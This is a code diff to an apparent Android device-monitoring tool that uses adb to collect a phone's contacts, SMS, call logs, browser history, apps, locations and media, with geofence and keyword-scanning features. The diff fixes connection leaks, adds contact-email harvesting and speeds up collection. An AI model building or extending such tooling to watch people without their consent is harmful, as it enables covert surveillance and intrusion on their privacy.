@@ -10,13 +10,15 @@ yield an empty list rather than an exception.
 """
 from __future__ import annotations
 
+import concurrent.futures
+import contextlib
 import json
 import re
 import sqlite3
 import threading
 import time
 from pathlib import Path
-from typing import Any, Dict, Iterable, List, Optional
+from typing import Any, Dict, Iterable, Iterator, List, Optional
 
 from pegasus.core.config import get_settings
 
@@ -41,8 +43,23 @@ def _connect() -> sqlite3.Connection:
     return conn
 
 
+@contextlib.contextmanager
+def _conn() -> Iterator[sqlite3.Connection]:
+    """Connection that commits on success and always closes.
+
+    `with _connect() as conn` only commits; the connection is not closed, so
+    every call leaked a descriptor.
+    """
+    conn = _connect()
+    try:
+        with conn:
+            yield conn
+    finally:
+        conn.close()
+
+
 def init_store() -> None:
-    with _LOCK, _connect() as conn:
+    with _LOCK, _conn() as conn:
         conn.executescript(
             """
             CREATE TABLE IF NOT EXISTS samples (
@@ -89,7 +106,7 @@ def save_samples(serial: str, kind: str, rows: Iterable[Dict[str, Any]], keep: i
     rows = list(rows)
     if not rows:
         return
-    with _LOCK, _connect() as conn:
+    with _LOCK, _conn() as conn:
         conn.execute(
             "INSERT INTO samples (serial, kind, payload, collected_at) VALUES (?,?,?,?)",
             (serial, kind, json.dumps(rows, default=str), time.time()),
@@ -103,7 +120,7 @@ def save_samples(serial: str, kind: str, rows: Iterable[Dict[str, Any]], keep: i
 
 
 def latest_sample(serial: str, kind: str) -> Optional[Dict[str, Any]]:
-    with _LOCK, _connect() as conn:
+    with _LOCK, _conn() as conn:
         row = conn.execute(
             "SELECT payload, collected_at FROM samples WHERE serial=? AND kind=? ORDER BY collected_at DESC LIMIT 1",
             (serial, kind),
@@ -118,7 +135,7 @@ def latest_sample(serial: str, kind: str) -> Optional[Dict[str, Any]]:
 
 
 def sample_history(serial: str, kind: str, limit: int = 10) -> List[Dict[str, Any]]:
-    with _LOCK, _connect() as conn:
+    with _LOCK, _conn() as conn:
         rows = conn.execute(
             "SELECT payload, collected_at FROM samples WHERE serial=? AND kind=? ORDER BY collected_at DESC LIMIT ?",
             (serial, kind, limit),
@@ -245,6 +262,17 @@ def collect_contacts(serial: str) -> List[Dict[str, Any]]:
         )
         if phone not in entry["phones"]:
             entry["phones"].append(phone)
+    for row in content_query(
+        serial,
+        "content://com.android.contacts/data/emails",
+        "display_name:data1",
+    ):
+        name = row.get("display_name") or "Unknown"
+        email = row.get("data1") or ""
+        if not email or name not in contacts:
+            continue
+        if email not in contacts[name]["emails"]:
+            contacts[name]["emails"].append(email)
     return list(contacts.values())
 
 
@@ -268,7 +296,7 @@ def collect_sms(serial: str, limit: int = 400) -> List[Dict[str, Any]]:
 
 
 def collect_calls(serial: str, limit: int = 400) -> List[Dict[str, Any]]:
-    rows = content_query(serial, "content://call_log/calls", "number:date:duration:type:name:cache")
+    rows = content_query(serial, "content://call_log/calls", "number:date:duration:type:name:cached_name")
     call_types = {1: "incoming", 2: "outgoing", 3: "missed", 4: "voicemail", 5: "rejected", 6: "blocked"}
     out = []
     for idx, row in enumerate(rows[:limit]):
@@ -354,15 +382,22 @@ def collect_apps(serial: str) -> List[Dict[str, Any]]:
                 "version": "",
             }
         )
-    # Enrich with version/size for the first 40 apps (bounded work).
-    for app in apps[:40]:
-        dump = run(
-            ["adb", "-s", serial, "shell", "dumpsys", "package", app["packageName"]],
-            timeout=12,
-        )
-        match = re.search(r"versionName=(\S+)", dump["stdout"])
-        if match:
-            app["version"] = match.group(1)
+    # One dumpsys for the whole device instead of 40 sequential round-trips.
+    dump = run(["adb", "-s", serial, "shell", "dumpsys", "package", "packages"], timeout=90)
+    versions: Dict[str, str] = {}
+    current = None
+    for line in dump["stdout"].splitlines():
+        header = re.match(r"\s*Package \[([\w.]+)\]", line)
+        if header:
+            current = header.group(1)
+            continue
+        if current:
+            match = re.search(r"versionName=(\S+)", line)
+            if match:
+                versions[current] = match.group(1)
+                current = None
+    for app in apps:
+        app["version"] = versions.get(app["packageName"], "")
     return apps
 
 
@@ -560,7 +595,7 @@ def collect(serial: str, kind: str, persist: bool = True) -> List[Dict[str, Any]
         if persist:
             save_samples(serial, "photos", result.get("photos", []))
             save_samples(serial, "videos", result.get("videos", []))
-        return []
+        return result.get("photos", []) + result.get("videos", [])
     rows = result if isinstance(result, list) else []
     if persist:
         save_samples(serial, kind, rows)
@@ -573,7 +608,7 @@ def collect(serial: str, kind: str, persist: bool = True) -> List[Dict[str, Any]
 
 
 def list_geofences(serial: str) -> List[Dict[str, Any]]:
-    with _LOCK, _connect() as conn:
+    with _LOCK, _conn() as conn:
         rows = conn.execute(
             "SELECT * FROM geofences WHERE serial=? ORDER BY created_at DESC", (serial,)
         ).fetchall()
@@ -593,7 +628,7 @@ def list_geofences(serial: str) -> List[Dict[str, Any]]:
 
 
 def create_geofence(serial: str, name: str, lat: float, lng: float, radius: int) -> Dict[str, Any]:
-    with _LOCK, _connect() as conn:
+    with _LOCK, _conn() as conn:
         cur = conn.execute(
             "INSERT INTO geofences (serial, name, lat, lng, radius_meters, is_active, created_at) VALUES (?,?,?,?,?,1,?)",
             (serial, name, lat, lng, radius, time.time()),
@@ -603,19 +638,19 @@ def create_geofence(serial: str, name: str, lat: float, lng: float, radius: int)
 
 
 def toggle_geofence(fence_id: int) -> bool:
-    with _LOCK, _connect() as conn:
+    with _LOCK, _conn() as conn:
         conn.execute("UPDATE geofences SET is_active = 1 - is_active WHERE id=?", (fence_id,))
     return True
 
 
 def delete_geofence(fence_id: int) -> bool:
-    with _LOCK, _connect() as conn:
+    with _LOCK, _conn() as conn:
         conn.execute("DELETE FROM geofences WHERE id=?", (fence_id,))
     return True
 
 
 def list_keywords(serial: str) -> List[Dict[str, Any]]:
-    with _LOCK, _connect() as conn:
+    with _LOCK, _conn() as conn:
         rows = conn.execute(
             "SELECT * FROM keywords WHERE serial=? ORDER BY created_at DESC", (serial,)
         ).fetchall()
@@ -634,7 +669,7 @@ def list_keywords(serial: str) -> List[Dict[str, Any]]:
 
 def create_keyword(serial: str, keyword: str) -> Dict[str, Any]:
     keyword = keyword.strip()
-    with _LOCK, _connect() as conn:
+    with _LOCK, _conn() as conn:
         cur = conn.execute(
             "INSERT INTO keywords (serial, keyword, hit_count, created_at) VALUES (?,?,0,?)",
             (serial, keyword, time.time()),
@@ -644,7 +679,7 @@ def create_keyword(serial: str, keyword: str) -> Dict[str, Any]:
 
 
 def delete_keyword(keyword_id: int) -> bool:
-    with _LOCK, _connect() as conn:
+    with _LOCK, _conn() as conn:
         conn.execute("DELETE FROM keywords WHERE id=?", (keyword_id,))
     return True
 
@@ -662,7 +697,7 @@ def scan_keywords(serial: str) -> List[Dict[str, Any]]:
     for page in latest_or_collect(serial, "browser")[:300]:
         corpus.append((page.get("title", ""), page.get("url", "")))
     hits: List[Dict[str, Any]] = []
-    with _LOCK, _connect() as conn:
+    with _LOCK, _conn() as conn:
         for kw in keywords:
             needle = kw["keyword"].lower()
             matches = [
@@ -694,7 +729,7 @@ def latest_or_collect(serial: str, kind: str) -> List[Dict[str, Any]]:
 
 
 def device_notes(serial: str) -> Dict[str, Any]:
-    with _LOCK, _connect() as conn:
+    with _LOCK, _conn() as conn:
         row = conn.execute("SELECT * FROM device_notes WHERE serial=?", (serial,)).fetchone()
     if not row:
         return {"serial": serial, "label": None, "group": None, "notes": None}
@@ -708,7 +743,7 @@ def device_notes(serial: str) -> Dict[str, Any]:
 
 
 def set_device_notes(serial: str, label: Optional[str], group: Optional[str], notes: Optional[str]) -> Dict[str, Any]:
-    with _LOCK, _connect() as conn:
+    with _LOCK, _conn() as conn:
         conn.execute(
             """INSERT INTO device_notes (serial, label, group_name, notes, updated_at)
                VALUES (?,?,?,?,?)
@@ -725,12 +760,15 @@ def _safe(value: str) -> str:
 
 
 def summary(serial: str) -> Dict[str, Any]:
-    contacts = latest_or_collect(serial, "contacts")
-    sms = latest_or_collect(serial, "sms")
-    calls = latest_or_collect(serial, "calls")
-    browser = latest_or_collect(serial, "browser")
-    apps = latest_or_collect(serial, "apps")
-    locations = latest_or_collect(serial, "locations")
+    kinds = ("contacts", "sms", "calls", "browser", "apps", "locations")
+    with concurrent.futures.ThreadPoolExecutor(max_workers=len(kinds)) as pool:
+        gathered = dict(zip(kinds, pool.map(lambda k: latest_or_collect(serial, k), kinds)))
+    contacts = gathered["contacts"]
+    sms = gathered["sms"]
+    calls = gathered["calls"]
+    browser = gathered["browser"]
+    apps = gathered["apps"]
+    locations = gathered["locations"]
     photos = latest_sample(serial, "photos") or {"rows": []}
     videos = latest_sample(serial, "videos") or {"rows": []}
     call_counts: Dict[str, Dict[str, Any]] = {}
